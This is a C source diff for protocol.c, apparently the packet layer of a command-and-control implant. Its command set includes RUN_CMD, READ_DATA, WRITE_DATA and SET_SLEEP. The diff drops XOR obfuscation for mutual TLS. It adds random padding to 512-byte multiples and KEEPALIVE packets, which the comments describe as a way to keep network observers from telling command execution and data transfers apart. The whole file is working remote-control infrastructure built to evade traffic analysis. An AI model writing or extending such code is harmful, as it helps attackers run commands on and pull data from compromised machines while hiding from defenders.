@@ -1,206 +1,175 @@
+/*
+ * protocol.c — packet send / receive over an mTLS Conn*.
+ *
+ * BP5 padding: every outgoing packet is padded to the next 512-byte boundary
+ * with cryptographically random bytes.  The receiver computes the same
+ * boundary from the payload_len in the header and reads the extra bytes.
+ * An observer capturing TLS records sees only uniform 512-byte multiples —
+ * HEARTBEAT, RUN_CMD, and large READ_DATA responses are all the same size
+ * class.
+ *
+ * The XOR / rotation obfuscation from the original protocol.c is removed.
+ * It provided no real security (trivially reversible with the static key) and
+ * is redundant once the channel is wrapped in TLS 1.3 AES-GCM.
+ */
+
 #include "protocol.h"
-#include <stdio.h>
 #include "platform.h"
+#include "tls.h"
+
+#include <openssl/ssl.h>
+
+#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-static const char XOR_KEY[] = {
-    0x4A, 0x7F, 0x3C, 0x91,
-    0xB2, 0x5E, 0xD8, 0x23,
-    0x6F, 0xA4, 0x19, 0xE7,
-    0x88, 0x2D, 0x55, 0xC3};
-static const int XOR_KEY_LEN = 16;
+/* ── Padding helpers (BP5) ───────────────────────────────────────────── */
 
-char *rotate(char *data, int len, int shift)
+/*
+ * Number of random pad bytes appended after the payload so that the total
+ * wire size (header + payload + pad) is the next 512-byte multiple above
+ * (12 + payload_len).
+ *
+ * ((msg / 512) + 1) * 512  always gives a value strictly greater than msg,
+ * so pad_bytes >= 1 for all inputs.
+ */
+static int pad_bytes_for(int payload_len)
 {
-    char *result = malloc(len);
-    memcpy(result, data, len);
-    for (int i = 0; i < len; i++)
-    {
-        result[i] = ((unsigned char)result[i] << shift) | ((unsigned char)result[i] >> (8 - shift));
-    }
-    return result;
+    int msg = 12 + payload_len;
+    return (msg / 512 + 1) * 512 - msg;
 }
 
-char *xor_obfuscate(char *data, int len)
+/* ── Low-level read / write through OpenSSL ──────────────────────────── */
+
+static int ssl_write_all(SSL *ssl, const char *buf, int len)
 {
-    char *result = malloc(len);
-    memcpy(result, data, len);
-    for (int i = 0; i < len; i++)
-    {
-        int xor_indice = i % XOR_KEY_LEN;
-        result[i] = result[i] ^ XOR_KEY[xor_indice];
+    int sent = 0;
+    while (sent < len) {
+        int n = SSL_write(ssl, buf + sent, len - sent);
+        if (n <= 0) return 0;
+        sent += n;
     }
-    return result;
-}
-
-int send_header(Packet *packet, int fd)
-{
-    const int HEADER_BYTES = 12;
-    int sent_bytes = 0;
-
-    int header_data[3] = {packet->command_type, packet->request_id, packet->payload_len};
-    char *data_as_char = (char *)header_data;
-
-    char *obfuscated_xor = xor_obfuscate(data_as_char, 12);
-    char *obfuscated_rotated = rotate(obfuscated_xor, 12, 3);
-    free(obfuscated_xor);
-
-    char *obfuscated_rotated_start = obfuscated_rotated;
-
-    while (sent_bytes != HEADER_BYTES)
-    {
-        int remaining_bytes = HEADER_BYTES - sent_bytes;
-        int bytes_this_call = send(fd, obfuscated_rotated, remaining_bytes, 0);
-
-        if (bytes_this_call == -1)
-        {
-            free(obfuscated_rotated_start);
-            return 0;
-        }
-
-        sent_bytes += bytes_this_call;
-        obfuscated_rotated = obfuscated_rotated + bytes_this_call;
-    }
-
-    free(obfuscated_rotated_start);
     return 1;
 }
 
-char *recieve_bytes(int n, int fd)
+static int ssl_read_all(SSL *ssl, char *buf, int len)
 {
-    int recieved_bytes = 0;
-    char *buffer = (char *)malloc(n);
-    char *start_buffer = buffer;
-
-    while (recieved_bytes != n)
-    {
-        int remaining_bytes = n - recieved_bytes;
-        int bytes_this_call = recv(fd, buffer, remaining_bytes, 0);
-
-        if (bytes_this_call == -1)
-        {
-            free(start_buffer);
-            return NULL;
-        }
-
-        if (bytes_this_call == 0)
-        {
-            free(start_buffer);
-            return NULL;
-        }
-
-        recieved_bytes += bytes_this_call;
-        buffer = buffer + bytes_this_call;
+    int done = 0;
+    while (done < len) {
+        int n = SSL_read(ssl, buf + done, len - done);
+        if (n <= 0) return 0;
+        done += n;
     }
-
-    return start_buffer;
+    return 1;
 }
 
-Packet *recieve_packet(int fd)
-{
-    char *header_obfuscated = recieve_bytes(12, fd);
+/* ── Public API ──────────────────────────────────────────────────────── */
 
-    if (header_obfuscated == NULL)
+int send_packet(Packet *packet, Conn *c)
+{
+    SSL *ssl = (SSL *)c->ssl;
+
+    /* Build header */
+    int header[3] = {
+        (int)packet->command_type,
+        packet->request_id,
+        packet->payload_len
+    };
+
+    int pad = pad_bytes_for(packet->payload_len);
+
+    /* Allocate one contiguous buffer: header + payload + random_pad */
+    int total = 12 + packet->payload_len + pad;
+    char *wire = malloc(total);
+    if (!wire) return 0;
+
+    memcpy(wire, header, 12);
+    if (packet->payload_len > 0)
+        memcpy(wire + 12, packet->payload, packet->payload_len);
+
+    /* Fill padding with cryptographically random bytes (BP5) */
+    secure_random(wire + 12 + packet->payload_len, pad);
+
+    int ok = ssl_write_all(ssl, wire, total);
+    free(wire);
+    return ok;
+}
+
+Packet *recieve_packet(Conn *c)
+{
+    SSL *ssl = (SSL *)c->ssl;
+
+    /* Read and decode header */
+    int header[3];
+    if (!ssl_read_all(ssl, (char *)header, 12))
         return NULL;
 
-    char *header_derotated = rotate(header_obfuscated, 12, 5);
-    char *header = xor_obfuscate(header_derotated, 12);
-    free(header_obfuscated);
-    free(header_derotated);
+    Command command_type = (Command)header[0];
+    int     request_id   = header[1];
+    int     payload_len  = header[2];
 
-    Packet *header_packet = (Packet *)header;
-
-    Command command_type = header_packet->command_type;
-    int request_id = header_packet->request_id;
-    int payload_len = header_packet->payload_len;
-
-    char *payload;
-    free(header);
-
-    if (payload_len == 0)
-    {
-        payload = NULL;
-    }
-    else
-    {
-        char *payload_obfuscated = recieve_bytes(payload_len, fd);
-
-        if (payload_obfuscated == NULL)
-            return NULL;
-
-        char *payload_derotated = rotate(payload_obfuscated, payload_len, 5);
-        payload = xor_obfuscate(payload_derotated, payload_len);
-        free(payload_derotated);
-        free(payload_obfuscated);
+    /* Validate payload_len to guard against corrupt / malicious headers */
+    if (payload_len < 0 || payload_len > 4 * 1024 * 1024) {
+        fprintf(stderr, "[proto] invalid payload_len %d\n", payload_len);
+        return NULL;
     }
 
-    Packet *packet = malloc(sizeof(Packet));
-    packet->command_type = command_type;
-    packet->request_id = request_id;
-    packet->payload_len = payload_len;
-    packet->payload = payload;
+    int pad = pad_bytes_for(payload_len);
 
-    return packet;
-}
+    /* Read payload + padding in one call */
+    int    tail_len = payload_len + pad;
+    char  *tail     = malloc(tail_len > 0 ? tail_len : 1);
+    if (!tail) return NULL;
 
-int send_packet(Packet *packet, int fd)
-{
-    int result = send_header(packet, fd);
-
-    if (result == 0)
-        return 0;
-
-    if (packet->payload_len == 0)
-        return 1;
-
-    int sent_bytes = 0;
-    int payload_length = packet->payload_len;
-    char *payload_ptr = packet->payload;
-
-    char *obfuscated_payload_xor = xor_obfuscate(payload_ptr, payload_length);
-    char *obfuscated_payload_rotated = rotate(obfuscated_payload_xor, payload_length, 3);
-    free(obfuscated_payload_xor);
-    char *obfuscated_payload_rotated_start = obfuscated_payload_rotated;
-
-    while (sent_bytes != payload_length)
-    {
-        int remaining_bytes = payload_length - sent_bytes;
-        int bytes_this_call = send(fd, obfuscated_payload_rotated, remaining_bytes, 0);
-
-        if (bytes_this_call == -1)
-        {
-            free(obfuscated_payload_rotated_start);
-            return 0;
-        }
-
-        sent_bytes += bytes_this_call;
-        obfuscated_payload_rotated = obfuscated_payload_rotated + bytes_this_call;
+    if (tail_len > 0 && !ssl_read_all(ssl, tail, tail_len)) {
+        free(tail);
+        return NULL;
     }
 
-    free(obfuscated_payload_rotated_start);
-    return 1;
+    /* Extract payload; discard random padding */
+    char *payload = NULL;
+    if (payload_len > 0) {
+        payload = malloc(payload_len);
+        if (!payload) { free(tail); return NULL; }
+        memcpy(payload, tail, payload_len);
+    }
+    free(tail);
+
+    /* BP5: silently drop KEEPALIVE and recurse for the real next packet */
+    if (command_type == COMMAND_KEEPALIVE) {
+        free(payload);
+        return recieve_packet(c);
+    }
+
+    Packet *pkt = malloc(sizeof(Packet));
+    if (!pkt) { free(payload); return NULL; }
+    pkt->command_type = command_type;
+    pkt->request_id   = request_id;
+    pkt->payload_len  = payload_len;
+    pkt->payload      = payload;
+    return pkt;
 }
 
 void free_packet(Packet *packet)
 {
-    if (packet->payload_len != 0)
+    if (!packet) return;
+    if (packet->payload_len > 0)
         free(packet->payload);
     free(packet);
 }
 
-char *map_enum_to_command_type(int command)
+/* ── Debug helper ────────────────────────────────────────────────────── */
+
+static const char *command_name(Command cmd)
 {
-    char *mappings[] = {"COMMAND_HELLO",
-                        "COMMAND_HEARTBEAT",
-                        "COMMAND_SET_SLEEP",
-                        "COMMAND_SHUTDOWN",
-                        "COMMAND_READ_DATA",
-                        "COMMAND_WRITE_DATA",
-                        "COMMAND_RUN_CMD",
-                        "COMMAND_ERROR",
-                        "COMMAND_RESPONSE"};
-    return mappings[command];
+    static const char *names[] = {
+        "HELLO", "HEARTBEAT", "SET_SLEEP", "SHUTDOWN",
+        "READ_DATA", "WRITE_DATA", "RUN_CMD", "ERROR",
+        "RESPONSE", "KEEPALIVE"
+    };
+    if ((int)cmd >= 0 && (int)cmd <= 9)
+        return names[(int)cmd];
+    return "UNKNOWN";
 }
 
 void print_packet_contents(Packet *packet)
@@ -208,18 +177,15 @@ void print_packet_contents(Packet *packet)
     printf("\n+----------------------------------+\n");
     printf("| %-32s |\n", "RECEIVED PACKET");
     printf("+----------------------------------+\n");
-    printf("| Command: %-23s |\n", map_enum_to_command_type(packet->command_type));
+    printf("| Command: %-23s |\n", command_name(packet->command_type));
     printf("| Req ID:  %-23d |\n", packet->request_id);
     printf("| Pay Len: %-23d |\n", packet->payload_len);
     printf("+----------------------------------+\n");
 
-    if (packet->payload_len == 0 || packet->payload == NULL)
-    {
+    if (packet->payload_len == 0 || packet->payload == NULL) {
         printf("| Payload: %-23s |\n", "<NONE>");
         printf("+----------------------------------+\n\n");
-    }
-    else
-    {
+    } else {
         printf("| %-32s |\n", "Payload: (see below)");
         printf("+----------------------------------+\n");
         printf("--- PAYLOAD BEGIN ---\n");
